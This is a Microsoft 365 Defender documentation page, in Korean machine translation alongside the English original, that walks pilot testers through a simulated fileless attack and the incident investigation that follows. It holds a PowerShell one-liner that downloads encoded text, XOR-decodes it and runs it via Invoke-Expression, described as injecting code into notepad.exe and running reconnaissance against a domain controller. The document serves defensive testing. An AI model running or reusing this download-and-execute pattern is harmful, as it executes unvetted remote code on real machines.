---
title: Microsoft 365 Defender 공격 시뮬레이션 실행
description: Microsoft 365 Defender 파일럿 프로젝트에 대한 공격 시뮬레이션을 실행하여 공격 시뮬레이션이 어떻게 진행되고 신속하게 수정하는지 볼 수 있습니다.
keywords: Microsoft 위협 방지 파일럿 공격 시뮬레이션, Microsoft 위협 방지 파일럿 공격 시뮬레이션 실행, Microsoft Threat Protection 파일럿 프로젝트, 사이버 보안, 고급 영구 위협, 엔터프라이즈 보안, 장치, ID, 사용자, 데이터, 응용 프로그램, 인시던트, 자동화된 조사 및 수정, 고급 헌팅
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: bb6472fdd52cdab0ab649fbb76b1ff6a683d6c80
ms.sourcegitcommit: 956176ed7c8b8427fdc655abcd1709d86da9447e
ms.translationtype: MT
ms.contentlocale: ko-KR
ms.lasthandoff: 03/23/2021
ms.locfileid: "51076292"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a><span data-ttu-id="eb80f-104">Microsoft 365 Defender 공격 시뮬레이션 실행</span><span class="sxs-lookup"><span data-stu-id="eb80f-104">Run your Microsoft 365 Defender attack simulations</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|<span data-ttu-id="eb80f-105">[![계획](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)</span><span class="sxs-lookup"><span data-stu-id="eb80f-105">[![Planning](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)</span></span><br/>[<span data-ttu-id="eb80f-106">계획</span><span class="sxs-lookup"><span data-stu-id="eb80f-106">Planning</span></span>](m365d-pilot-plan.md)|<span data-ttu-id="eb80f-107">[![준비](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)</span><span class="sxs-lookup"><span data-stu-id="eb80f-107">[![Prepare](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)</span></span><br/>[<span data-ttu-id="eb80f-108">준비</span><span class="sxs-lookup"><span data-stu-id="eb80f-108">Preparation</span></span>](prepare-m365d-eval.md)|![공격 시뮬레이션](../../media/phase-diagrams/3-simluate.png)<br/><span data-ttu-id="eb80f-110">공격 시뮬레이션</span><span class="sxs-lookup"><span data-stu-id="eb80f-110">Simulate attack</span></span>|<span data-ttu-id="eb80f-111">[![닫기 및 요약](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)</span><span class="sxs-lookup"><span data-stu-id="eb80f-111">[![Close and summarize](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)</span></span><br/>[<span data-ttu-id="eb80f-112">닫기 및 요약</span><span class="sxs-lookup"><span data-stu-id="eb80f-112">Close and summarize</span></span>](m365d-pilot-close.md)|
|--|--|--|--|
|||<span data-ttu-id="eb80f-113">*여기 있습니다!*</span><span class="sxs-lookup"><span data-stu-id="eb80f-113">*You are here!*</span></span>||

<span data-ttu-id="eb80f-114">현재 공격 시뮬레이션 단계에 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-114">You're currently in the attack simulation phase.</span></span>

<span data-ttu-id="eb80f-115">파일럿 환경을 준비한 후 Microsoft 365 Defender 인시던트 관리 및 자동화된 조사 및 수정 기능을 테스트해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-115">After preparing your pilot environment, it's time to test the Microsoft 365 Defender incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="eb80f-116">고급 기술을 활용하여 감지에서 숨기는 정교한 공격을 시뮬레이트하는 데 도움을 줄 것입니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-116">We'll help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="eb80f-117">이 공격은 도메인 컨트롤러에서 연 SMB(서버 메시지 블록) 세션을 열고 사용자의 장치의 최근 IP 주소를 검색합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-117">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users' devices.</span></span> <span data-ttu-id="eb80f-118">일반적으로 이 공격 범주에는 피해자의 장치에 삭제된 파일이 포함되어 있는 것이 아니라 메모리에서만 발생합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-118">This category of attacks usually doesn't include files dropped on the victim's device—they occur solely in memory.</span></span> <span data-ttu-id="eb80f-119">기존 시스템 및 관리 도구를 사용하여 "육지에서 라이브"한 후 실행을 숨기기 위해 시스템 프로세스에 코드를 삽입합니다. 이러한 동작을 사용하면 검색을 피하고 디바이스에서 유지될 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-119">They "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution, Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="eb80f-120">이 시뮬레이션에서는 샘플 시나리오가 PowerShell 스크립트로 시작됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-120">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="eb80f-121">사용자가 스크립트를 실행하도록 속일 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-121">A user might be tricked into running a script.</span></span> <span data-ttu-id="eb80f-122">또는 스크립트가 이전에 감염된 장치에서 다른 컴퓨터로의 원격 연결(공격자가 네트워크에서 을(를) 이동하려고 시도할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-122">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="eb80f-123">관리자가 스크립트를 원격으로 실행하여 다양한 관리 작업을 수행하기도 하여 이러한 스크립트를 검색하기 어려울 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-123">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![프로세스 주입 및 SMB 정비 공격 다이어그램을 사용하여 파일 없는 PowerShell 공격](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="eb80f-125">시뮬레이션하는 동안 공격은 셸코드를 무고한 프로세스에 주입합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-125">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="eb80f-126">이 시나리오에서는 이 시나리오를 사용하려면 notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="eb80f-126">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="eb80f-127">시뮬레이션을 위해 이 프로세스를 선택했지만 공격자는 추가와 같은 장기 실행 시스템 프로세스를 대상으로 할 svchost.exe.</span><span class="sxs-lookup"><span data-stu-id="eb80f-127">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="eb80f-128">그런 다음 셸 코드는 공격자 명령 및 제어(C2) 서버에 연결하여 진행 방법에 대한 지침을 수신합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-128">The shellcode then goes on to contact the attacker's command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="eb80f-129">스크립트는 DC(도메인 컨트롤러)에 대해 정비 쿼리 실행을 시도합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-129">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="eb80f-130">정비를 통해 공격자는 최근 사용자 로그인 정보에 대한 정보를 얻을 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-130">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="eb80f-131">공격자가 이 정보를 가지면 네트워크에서 을(를) 이동하여 특정 중요한 계정으로 이동할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-131">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

> [!IMPORTANT]
> <span data-ttu-id="eb80f-132">최적의 결과를 얻기 위해 가능한 한 공격 시뮬레이션 지침을 따르세요.</span><span class="sxs-lookup"><span data-stu-id="eb80f-132">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>

## <a name="simulation-environment-requirements"></a><span data-ttu-id="eb80f-133">시뮬레이션 환경 요구 사항</span><span class="sxs-lookup"><span data-stu-id="eb80f-133">Simulation environment requirements</span></span>

<span data-ttu-id="eb80f-134">준비 단계에서 파일럿 환경을 이미 구성한 것이기 때문에 이 시나리오에 대해 테스트 장치와 도메인 컨트롤러의 두 장치가 있는지 확인합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-134">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1. <span data-ttu-id="eb80f-135">테넌트에서 [Microsoft 365 Defender를 사용하도록 설정되어 있는지 확인합니다.](m365d-enable.md#confirm-that-the-service-is-on)</span><span class="sxs-lookup"><span data-stu-id="eb80f-135">Verify your tenant has [enabled Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span></span>

2. <span data-ttu-id="eb80f-136">테스트 도메인 컨트롤러 구성 확인:</span><span class="sxs-lookup"><span data-stu-id="eb80f-136">Verify your test domain controller configuration:</span></span>

   - <span data-ttu-id="eb80f-137">디바이스는 Windows Server 2008 R2 이상 버전에서 실행됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-137">Device runs with Windows Server 2008 R2 or a later version.</span></span>
   - <span data-ttu-id="eb80f-138">ID에 대한 [Microsoft Defender에 대한](/azure/security-center/security-center-wdatp) 테스트 도메인 컨트롤러를 사용하여 원격 [관리를 사용하도록 설정합니다.](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)</span><span class="sxs-lookup"><span data-stu-id="eb80f-138">The test domain controller to [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) and enable [remote management](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>
   - <span data-ttu-id="eb80f-139">ID에 [대한 Microsoft Defender 및 Microsoft Cloud App Security 통합이](/cloud-app-security/mdi-integration) 활성화되어 있는지 확인합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-139">Verify that [Microsoft Defender for Identity and Microsoft Cloud App Security integration](/cloud-app-security/mdi-integration) have been enabled.</span></span>
   - <span data-ttu-id="eb80f-140">테스트 사용자가 도메인에 만들어지며 관리자 권한이 필요하지 않습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-140">A test user is created on your domain – no admin permissions needed.</span></span>

3. <span data-ttu-id="eb80f-141">테스트 장치 구성 확인:</span><span class="sxs-lookup"><span data-stu-id="eb80f-141">Verify test device configuration:</span></span>

   1. <span data-ttu-id="eb80f-142">디바이스는 Windows 10 버전 1903 이상 버전에서 실행됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-142">Device runs with Windows 10 version 1903 or a later version.</span></span>

   1. <span data-ttu-id="eb80f-143">테스트 장치가 테스트 도메인에 연결됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-143">Test device is joined to the test domain.</span></span>

   1. <span data-ttu-id="eb80f-144">[바이러스 백신을 Windows Defender 을 상태로 합니다.](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)</span><span class="sxs-lookup"><span data-stu-id="eb80f-144">[Turn on Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="eb80f-145">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span><span class="sxs-lookup"><span data-stu-id="eb80f-145">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>

   1. <span data-ttu-id="eb80f-146">테스트 장치가 [끝점용 Microsoft Defender에 온보딩된지 확인합니다.](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)</span><span class="sxs-lookup"><span data-stu-id="eb80f-146">Verify that the test device is [onboarded to Microsoft Defender for Endpoint)](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="eb80f-147">기존 테넌트를 사용하여 장치 그룹을 구현하는 경우 테스트 장치에 대한 전용 장치 그룹을 만들고 구성 UX에서 최상위 수준으로 푸시합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-147">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>

## <a name="run-the-attack-scenario-simulation"></a><span data-ttu-id="eb80f-148">공격 시나리오 시뮬레이션 실행</span><span class="sxs-lookup"><span data-stu-id="eb80f-148">Run the attack scenario simulation</span></span>

<span data-ttu-id="eb80f-149">공격 시나리오 시뮬레이션을 실행합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-149">To run the attack scenario simulation:</span></span>

1. <span data-ttu-id="eb80f-150">테스트 사용자 계정을 사용하여 테스트 장치에 로그인합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-150">Log in to the test device with the test user account.</span></span>

2. <span data-ttu-id="eb80f-151">테스트 Windows PowerShell 창을 열 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-151">Open a Windows PowerShell window on the test device.</span></span>

3. <span data-ttu-id="eb80f-152">다음 시뮬레이션 스크립트를 복사합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-152">Copy the following simulation script:</span></span>

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > <span data-ttu-id="eb80f-153">웹 브라우저에서 이 문서를 열면 특정 문자를 잃거나 추가 줄 변경 없이 전체 텍스트를 복사하는 데 문제가 발생할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-153">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="eb80f-154">이 문서를 다운로드하여 Adobe Reader에서 여는 경우</span><span class="sxs-lookup"><span data-stu-id="eb80f-154">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="eb80f-155">프롬프트에서 복사한 스크립트를 붙여넣고 실행합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-155">At the prompt, paste and run the copied script.</span></span>

> [!NOTE]
> <span data-ttu-id="eb80f-156">RDP(원격 데스크톱 프로토콜)를 사용하여 PowerShell을 실행하는 경우 **CTRL-V** 바로 가기 키 또는 마우스 오른쪽 단추 클릭 붙여넣기 메서드가 작동하지 않을 수 있기 때문에 RDP 클라이언트에서 클립보드 텍스트 형식 명령을 사용합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-156">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span> <span data-ttu-id="eb80f-157">최신 버전의 PowerShell에서도 이 메서드를 허용하지 않는 경우도 있습니다. 메모리의 메모장에 먼저 복사하여 가상 머신에 복사한 다음 PowerShell에 붙여넣아야 할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-157">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="eb80f-158">몇 초 후에 <i>notepad.exe</i> 열립니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-158">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="eb80f-159">시뮬레이트된 공격 코드는 해당 코드에 notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="eb80f-159">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="eb80f-160">전체 시나리오를 경험할 수 있는 자동 생성된 메모장 인스턴스를 열어 두십시오.</span><span class="sxs-lookup"><span data-stu-id="eb80f-160">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="eb80f-161">시뮬레이트된 공격 코드는 외부 IP 주소(C2 서버 시뮬레이트)와 통신한 다음 SMB를 통해 도메인 컨트롤러에 대한 정경을 시도합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-161">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="eb80f-162">이 스크립트가 완료되면 PowerShell 콘솔에 메시지가 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-162">You'll see a message displayed on the PowerShell console when this script completes.</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

<span data-ttu-id="eb80f-163">자동화된 인시던트 및 대응 기능이 실제로 실행되고 notepad.exe 열어 봐야 합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-163">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="eb80f-164">자동화된 인시던트 및 응답으로 메모장 프로세스가 중지됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-164">You'll see Automated Incident and Response stop the Notepad process.</span></span>

## <a name="investigate-an-incident"></a><span data-ttu-id="eb80f-165">인시던트 조사</span><span class="sxs-lookup"><span data-stu-id="eb80f-165">Investigate an incident</span></span>

> [!NOTE]
> <span data-ttu-id="eb80f-166">이 시뮬레이션을 진행하기 전에 다음 비디오를 시청하여 인시던트 관리가 관련 경고를 조사 프로세스의 일부로 모을 수 있는 방법, 포털에서 찾을 수 있는 위치 및 보안 작업에 도움이 되는 방법을 참조합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-166">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="eb80f-167">SOC 분석가의 시선으로 전환하면 이제 Microsoft 365 보안 센터 포털에서 공격 조사를 시작할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-167">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span>

1. <span data-ttu-id="eb80f-168">모든 장치에서 [Microsoft 365 보안](https://security.microsoft.com/incidents) 센터 포털 인시던트 큐를 열 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-168">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2. <span data-ttu-id="eb80f-169">메뉴에서 **인시던트로** 이동합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-169">Navigate to **Incidents** from the menu.</span></span>

    ![Microsoft 365 보안 센터의 왼쪽 메뉴에 표시된 인시던트 스크린샷](../../media/mtp/fig1.png)

3. <span data-ttu-id="eb80f-171">시뮬레이트된 공격에 대한 새 인시던트가 인시던트 큐에 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-171">The new incident for the simulated attack will appear in the incident queue.</span></span>

    ![문제 큐 스크린샷](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="eb80f-173">단일 인시던트로 공격 조사</span><span class="sxs-lookup"><span data-stu-id="eb80f-173">Investigate the attack as a single incident</span></span>

<span data-ttu-id="eb80f-174">Microsoft 365 Defender는 분석을 상관 관계화하고 서로 다른 제품의 모든 관련 경고 및 조사를 하나의 인시던트 엔터티로 집계합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-174">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="eb80f-175">이를 통해 Microsoft 365 Defender는 더 광범위한 공격 스토리를 보여 주며 SOC 분석가가 복잡한 위협을 이해하고 대응할 수 있도록 합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-175">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="eb80f-176">이 시뮬레이션 중에 생성된 경고는 동일한 위협과 연결되며 그 결과로 자동으로 단일 인시던트로 집계됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-176">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="eb80f-177">인시던트 보기:</span><span class="sxs-lookup"><span data-stu-id="eb80f-177">To view the incident:</span></span>

1. <span data-ttu-id="eb80f-178">**인시던트 큐로** 이동합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-178">Navigate to the **Incidents** queue.</span></span>

   ![탐색 메뉴의 인시던트 스크린샷](../../media/mtp/fig1.png)

2. <span data-ttu-id="eb80f-180">사고 이름 왼쪽에 있는 원을 클릭하여 새 항목을 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-180">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="eb80f-181">사이드 패널에는 모든 관련 경고를 포함하여 인시던트에 대한 추가 정보가 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-181">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="eb80f-182">각 인시던트에는 포함된 경고의 특성에 따라 해당 이름을 설명하는 고유한 이름이 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-182">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

   ![시뮬레이션 중에 생성된 경고가 집계되는 인시던트 페이지의 스크린샷](../../media/mtp/fig4.png)

   <span data-ttu-id="eb80f-184">대시보드에 표시하는 경고는 ID용 Microsoft Defender, Microsoft Cloud App Security, Endpoint용 Microsoft Defender, Microsoft 365 Defender 및 Office 365용 Microsoft Defender의 서비스 리소스에 따라 필터링할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-184">The alerts that show in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>

3. <span data-ttu-id="eb80f-185">**인시던트에 대한** 자세한 정보를 확인하려면 문제 페이지 열기 를 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-185">Select **Open incident page** to get more information about the incident.</span></span>

   <span data-ttu-id="eb80f-186">**인시던트 페이지에서** 인시던트와 관련된 모든 경고 및 정보를 볼 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-186">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="eb80f-187">이 정보에는 경고와 관련된 엔터티 및 자산, 경고의 검색 원본(ID에 대한 Microsoft Defender, EDR), 함께 연결된 이유가 포함됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-187">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (Microsoft Defender for Identity, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="eb80f-188">인시던트 경고 목록을 검토하면 공격의 진행률이 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-188">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="eb80f-189">이 보기에서 개별 경고를 보고 조사할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-189">From this view, you can see and investigate the individual alerts.</span></span>

   <span data-ttu-id="eb80f-190">오른쪽 메뉴에서  인시던트 관리를 클릭하여 인시던트에 태그를 지정하고, 인시던트에 할당하고, 설명을 추가할 수도 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-190">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

   ![인시던트 관리를 클릭할 위치 스크린샷](../../media/mtp/fig5a.png)

   ![<span data-ttu-id="eb80f-192">인시던트에 태그를 지정하고, 인시던트에 할당하고, 설명을 추가할 수 있는 문제 관리 패널의 필드 스크린샷</span><span class="sxs-lookup"><span data-stu-id="eb80f-192">Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments</span></span> ](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a><span data-ttu-id="eb80f-193">생성된 경고 검토</span><span class="sxs-lookup"><span data-stu-id="eb80f-193">Review generated alerts</span></span>

<span data-ttu-id="eb80f-194">시뮬레이트된 공격 중에 생성되는 몇 가지 경고를 살펴보아 봐야 합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-194">Let's look at some of the alerts generated during the simulated attack.</span></span>

> [!NOTE]
> <span data-ttu-id="eb80f-195">시뮬레이트된 공격 중에 생성된 몇 가지 경고만 진행합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-195">We'll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="eb80f-196">Windows 버전 및 테스트 장치에서 실행 중인 Microsoft 365 Defender 제품에 따라 약간 다른 순서로 더 많은 경고가 표시될 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-196">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![생성된 경고 스크린샷](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a><span data-ttu-id="eb80f-198">경고: 관찰된 의심스러운 프로세스 삽입(원본: Endpoint EDR용 Microsoft Defender)</span><span class="sxs-lookup"><span data-stu-id="eb80f-198">Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint EDR)</span></span>

<span data-ttu-id="eb80f-199">고급 공격자는 정교한 도용 방법을 사용하여 메모리를 유지하고 검색 도구에서 숨길 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-199">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="eb80f-200">한 가지 일반적인 기술은 악의적인 실행이 아닌 신뢰할 수 있는 시스템 프로세스 내에서 작동하여 검색 도구 및 보안 운영에서 악성 코드를 발견하기 어렵게 만드는 것입니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-200">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="eb80f-201">SOC 분석가가 이러한 고급 공격을 감지할 수 있도록 끝점용 Microsoft Defender의 심층 메모리 센서는 다양한 프로세스 간 코드 삽입 기술에 대한 전례 없는 가시성을 클라우드 서비스를 제공합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-201">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="eb80f-202">다음 그림에서는 Endpoint용 Defender가 에 코드를 삽입하려고 시도를 감지하고 경고하는 <i>방법을notepad.exe. </i></span><span class="sxs-lookup"><span data-stu-id="eb80f-202">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![잠재적으로 악성 코드 삽입에 대한 경고 스크린샷](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a><span data-ttu-id="eb80f-204">경고: 명령줄 인수가 없는 프로세스가 실행되는 예기치 않은 동작(원본: Endpoint EDR용 Microsoft Defender)</span><span class="sxs-lookup"><span data-stu-id="eb80f-204">Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint EDR)</span></span>

<span data-ttu-id="eb80f-205">끝점 검색을 위한 Microsoft Defender는 종종 공격 기술의 가장 일반적인 특성을 대상으로 합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-205">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="eb80f-206">이 방법을 사용하면 지속성이 보장되고 공격자가 최신 전략으로 전환할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-206">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="eb80f-207">당사는 대규모 학습 알고리즘을 사용하여 조직 및 전 세계에 있는 일반적인 프로세스의 정상적인 동작을 설정하고 이러한 프로세스가 정상적인 동작을 표시하는 경우를 감시합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-207">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="eb80f-208">이러한 특이한 동작은 종종 신뢰할 수 있는 프로세스에서 불일치 코드가 도입되고 실행되고 있는 것을 나타냅니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-208">These anomalous behaviors often indicate that extraneous code was introduced and are running in an otherwise trusted process.</span></span>

